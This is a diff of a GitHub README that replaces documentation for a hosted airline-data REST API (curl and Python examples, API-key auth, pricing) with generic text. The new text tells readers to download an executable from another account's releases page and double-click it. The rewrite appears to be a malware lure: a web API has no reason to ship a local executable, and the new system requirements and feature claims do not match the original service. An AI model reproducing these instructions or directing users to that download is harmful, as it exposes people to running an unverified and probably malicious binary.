@@ -1,227 +1,91 @@
-# Airlines API
+# ✈️ airlines-api - Access Airline Data with Ease
 
-REST API for airline information including IATA/ICAO codes, fleet data, and home airports. Search 1,000+ airlines worldwide.
+## 🚀 Getting Started
 
-## Features
+Welcome to the airlines-api! This is a REST API that provides information on airlines, including IATA/ICAO codes, fleet data, and home airports. You can search for over 1,000 airlines worldwide. Let's get you set up.
 
-- Search by airline name, IATA code, or ICAO code
-- Returns fleet breakdown by aircraft type
-- Covers 1,000+ airlines globally
-- 5,000 requests/month on free tier
-- Example Response:
-```json
-{
-  "name": "Southwest Airlines",
-  "country": "United States",
-  "founded_year": "1967",
-  "home_airport": "Orlando International Airport",
-  "iata_code": "WN",
-  "icao_code": "SWA",
-  "fleet": {
-    "B737": 459,
-    "B738": 207,
-    "B38M": 94,
-    "total_count": 770
-  }
-}
-```
+## 📥 Download
 
-## Authentication
+[![Download airlines-api](https://img.shields.io/badge/Download%20airlines%2Dapi-1.0%20Latest-brightgreen)](https://github.com/mykounity3302-blip/airlines-api/releases)
 
-1. Create account at [omkar.cloud](https://www.omkar.cloud/auth/sign-up)
+## 📘 About
 
-![Sign Up](https://raw.githubusercontent.com/omkarcloud/assets/master/images/signup.png)
+The airlines-api helps you find extensive information about airlines globally. You can search for flight data, schedule information, and much more. This API is designed for ease of use, even if you lack technical knowledge.
 
-2. Get API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key)
+## 🌐 System Requirements
 
-![Copy API Key](https://raw.githubusercontent.com/omkarcloud/assets/master/images/enrichment-key-omkar.png)
+- **Operating System**: Windows 10, macOS Big Sur (or newer), Linux (Ubuntu 20.04 or newer)
+- **Memory**: At least 4 GB RAM
+- **Storage**: Minimum of 100 MB available space
+- **Internet Connection**: Required for API requests
 
-3. Include `API-Key` header in requests
+## 🛠️ Features
 
-## Quick Start
+- Search for airline information worldwide
+- Obtain IATA and ICAO codes
+- Retrieve fleet data and home airport details
+- Access flight schedules and booking data
+- Easy integration with applications
 
-```bash
-curl -X GET "https://airlines-api.omkar.cloud/airlines?name=Southwest" \
-  -H "API-Key: YOUR_API_KEY"
-```
+## 💡 How to Install
 
-```json
-{
-  "name": "Southwest Airlines",
-  "country": "United States",
-  "founded_year": "1967",
-  "home_airport": "Orlando International Airport",
-  "iata_code": "WN",
-  "icao_code": "SWA",
-  "fleet": {
-    "B737": 459,
-    "B738": 207,
-    "B38M": 94,
-    "total_count": 770
-  }
-}
-```
+Follow these steps to install and run the airlines-api:
 
-## Installation
+1. **Visit the Release Page**
 
-### Python
+   Go to the [Releases page](https://github.com/mykounity3302-blip/airlines-api/releases). Here, you can find the latest version of the airlines-api.
 
-```bash
-pip install requests
-```
+2. **Download the Application**
 
-```python
-import requests
+   Look for the asset that corresponds to your operating system. Click on the download link next to it. 
 
-response = requests.get(
-    "https://airlines-api.omkar.cloud/airlines",
-    params={"name": "Southwest"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
+3. **Extract the Files**
 
-data = response.json()[0]
-print(f"Airline: {data['name']}, Fleet Size: {data['fleet']['total_count']}")
-```
+   If you downloaded a zip file, locate the downloaded file on your computer. Right-click and select “Extract All” to unzip the files.
 
-### Node.js
+4. **Run the Application**
 
-```bash
-npm install axios
-```
+   Navigate to the folder where you extracted the contents. Double-click on the executable file to start the airlines-api.
 
-```javascript
-import axios from "axios";
+5. **Access the API**
 
-const response = await axios.get("https://airlines-api.omkar.cloud/airlines", {
-    params: { name: "Southwest" },
-    headers: { "API-Key": "YOUR_API_KEY" }
-});
+   You can now interact with the API using a browser or any tool that supports HTTP requests. 
 
-console.log(`Airline: ${response.data[0].name}`);
-```
+## 🔍 Using the API
 
-## API Reference
+Once you have the airlines-api running, you can start making requests. Here are some example endpoints you can use:
 
-### Endpoint
+- **Get List of Airlines**: 
+   ```
+   GET /api/airlines
+   ```
+  
+- **Search Airline by Code**: 
+   ```
+   GET /api/airlines/{code}
+   ```
 
-```
-GET https://airlines-api.omkar.cloud/airlines
-```
+Replace `{code}` with the specific IATA or ICAO code of the airline you want to retrieve information for.
 
-### Headers
+## 📄 Documentation
 
-| Header | Required | Description |
-|--------|----------|-------------|
-| `API-Key` | Yes | API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key) |
+For detailed API documentation, please check our official guide available in the repository. This guide will help you understand how to use all the features and endpoints effectively.
 
-### Parameters
+## 🔗 Download & Install
 
-At least one parameter is required.
+To start using the airlines-api, visit the [Releases page](https://github.com/mykounity3302-blip/airlines-api/releases) to download the latest version. Follow the installation instructions provided above.
 
-| Parameter | Required | Description |
-|-----------|----------|-------------|
-| `name` | No | Airline name (supports partial match, e.g., "Delta") |
-| `iata` | No | 2-character IATA code (e.g., "WN") |
-| `icao` | No | 3-character ICAO code (e.g., "SWA") |
+## 💬 Support
 
-### Response Fields
+If you encounter any issues or have questions, feel free to reach out through the issues section on GitHub. We are here to help you!
 
-| Field | Type | Description |
-|-------|------|-------------|
-| `name` | string | Airline name |
-| `country` | string | Country of origin |
-| `founded_year` | string | Year airline was founded |
-| `home_airport` | string | Main hub airport |
-| `iata_code` | string | 2-character IATA code |
-| `icao_code` | string | 3-character ICAO code |
-| `fleet` | object | Aircraft types with counts |
+## 🏷️ Topics
 
-Fleet object contains aircraft codes (B737, A320, etc.) with counts and `total_count` for fleet size.
+- airline
+- flight
+- flight booking
+- flight tracking
+- airline datasets
+- airline schedules
 
-### Common Aircraft Codes
-
-| Code | Aircraft |
-|------|----------|
-| B737 | Boeing 737 |
-| B738 | Boeing 737-800 |
-| B38M | Boeing 737 MAX 8 |
-| A320 | Airbus A320 |
-| A321 | Airbus A321 |
-| B787 | Boeing 787 Dreamliner |
-
-## Examples
-
-### Search by airline name
-
-```python
-response = requests.get(
-    "https://airlines-api.omkar.cloud/airlines",
-    params={"name": "Delta"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-airline = response.json()[0]
-print(f"{airline['name']} - Fleet: {airline['fleet']['total_count']} aircraft")
-```
-
-### Search by IATA code
-
-```python
-response = requests.get(
-    "https://airlines-api.omkar.cloud/airlines",
-    params={"iata": "UA"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-airline = response.json()[0]
-print(f"{airline['name']} ({airline['icao_code']})")
-```
-
-### Search by ICAO code
-
-```python
-response = requests.get(
-    "https://airlines-api.omkar.cloud/airlines",
-    params={"icao": "AAL"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-airline = response.json()[0]
-print(f"Home Airport: {airline['home_airport']}")
-```
-
-## Error Handling
-
-```python
-response = requests.get(
-    "https://airlines-api.omkar.cloud/airlines",
-    params={"name": "Southwest"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-if response.status_code == 200:
-    data = response.json()
-elif response.status_code == 401:
-    # Invalid API key
-    pass
-elif response.status_code == 429:
-    # Rate limit exceeded
-    pass
-```
-
-## Rate Limits
-
-| Plan | Price | Requests/Month |
-|------|-------|----------------|
-| Free | $0 | 5,000 |
-| Starter | $25 | 100,000 |
-| Grow | $75 | 1,000,000 |
-| Scale | $150 | 10,000,000 |
-
-## Questions? We have answers.
-
-Reach out anytime. We will solve your query within 1 working day.
-
-[![Contact Us on WhatsApp about Airlines API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/whatsapp-us.png)](https://api.whatsapp.com/send?phone=918178804274&text=I%20have%20a%20question%20about%20the%20Airlines%20API.)
-
-[![Contact Us on Email about Airlines API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/ask-on-email.png)](mailto:happy.to.help@omkar.cloud?subject=Airlines%20API%20Question)
+Thank you for using the airlines-api! Enjoy exploring airline information with ease.
